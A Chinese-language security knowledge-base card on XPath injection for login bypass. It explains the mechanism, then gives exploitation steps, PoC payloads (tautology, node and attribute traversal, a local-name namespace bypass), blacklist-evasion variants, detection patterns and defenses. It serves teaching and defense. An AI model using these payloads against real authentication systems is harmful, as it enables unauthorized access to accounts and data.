---
id: web-generic-xpath-auth-bypass
title: XPath 注入闭合谓词实现登录认证绕过与全节点遍历
type: scenario
domain: web
path: web/generic/xpath
technique: xpath-injection
aliases:
- XPath injection
- XPath 注入
- XPath auth bypass
- XPath 认证绕过
tags:
- web
- xpath
- injection
- auth-bypass
- xml
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:09:29+08:00'
  notes: 已对照原文与6张图核对：恒真载荷 admin' or '1'='1、节点/属性遍历 ']|//*|//*['、local-name 命名空间绕过均与原文一致；图06 显示本地测试页登录成功并返回 administrator。原文为科普，无具体产品/版本/CVE；frontmatter 无 sources/source_url，PoC 未在真实目标复现。
---

## 一句话结论

当应用把用户输入直接拼进 XPath 谓词的字符串字面量时，提交 `' or '1'='1` 可闭合引号并注入恒真条件，绕过登录并匹配到文档中的全部节点。

## 原理

XPath 字符串字面量用单引号或双引号包裹，查询在拼接后交给 XML 解析器执行。攻击者输入的单引号提前结束字面量，后续内容被当作 XPath 表达式而非数据。由于 XPath 没有 SQL 的转义机制，只要目标代码不做白名单校验或参数化，注入的 `or '1'='1'` 就使谓词整体为真，`//user[...]` 返回所有用户节点，登录逻辑取到第一条记录即判定成功。

以 `//user[username/text()='{username}' and password/text()='{password}']` 为例，用户名和密码都填 `' or '1'='1` 时展开为：

```xpath
//user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

XPath 中 `and` 优先级高于 `or`，表达式等价于 `(username='') or ('1'='1' and password='') or ('1'='1')`，最后一项恒真，因此谓词匹配全部 `user` 节点。

## 触发条件

- 应用使用 XPath 在 XML 文档（如用户配置、身份库）中查询；
- 查询语句由用户输入字符串拼接而成；
- 输入进入的是 XPath 字符串字面量位置，且未做严格字符白名单；
- 应用根据查询结果是否非空判断登录成功（常见）。

## 利用步骤

1. 在用户名或密码处提交单引号，观察是否报错或响应变化，确认拼接点；
2. 用 `' or '1'='1` 测试恒真，确认返回结果非空；
3. 若双字段都要校验，两处都注入，使整条谓词恒真；
4. 登录成功后读取返回的用户角色/资料，判断是否匹配到管理员；
5. 结构未知时用节点遍历载荷枚举文档。

## PoC

登录查询假设：

```xpath
//user[username/text()='{username}' and password/text()='{password}']
```

认证绕过：

```text
username: ' or '1'='1
password: ' or '1'='1
```

单字段（密码为空也可）载荷：

```text
admin' or '1'='1
```

未知结构时遍历全部节点：

```text
']|//*|//*['
```

遍历全部属性：

```text
']|//@*|//*['
```

命名空间文档中绕过前缀限制（`local-name()` 返回不带前缀的标签名）：

```text
' or local-name()='user' or '1'='1
```

## 变体与关联

- 注释绕过：`' or '1'='1' (: comment :) and '1'='1`，XPath 注释为 `(: ... :)`；
- 实体编码绕过：`&#39; or &#39;1&#39;=&#39;1`，适用于输入端先做 HTML 实体解码、但未处理单引号的场景；
- 大小写变形：`' OR '1'='1' AND '1'='1`，绕过区分大小写的关键字黑名单；
- 双引号包裹场景把单引号换成双引号；
- 关联：SQL 注入的恒真认证绕过（原理同构）、XXE（同以 XML 为入口）。

## 检测与防御

- 检测：请求参数中出现 `'`、`or 1=1`、`local-name(`、`//*`、`(:` 等 XPath 语法特征；XPath 解析异常日志；
- 防御：不拼接查询，改用 DOM/对象 API 直接比较节点值（不走 XPath 字符串）；对输入做 `^[A-Za-z0-9_]+$` 白名单；无法参数化时对单双引号做严格转义；查询结果为空与多条结果都要按失败处理，避免“取第一条”逻辑；
- 权限最小化：认证查询只允许访问指定节点，拒绝包含并集 `|`、`//*` 的表达式。
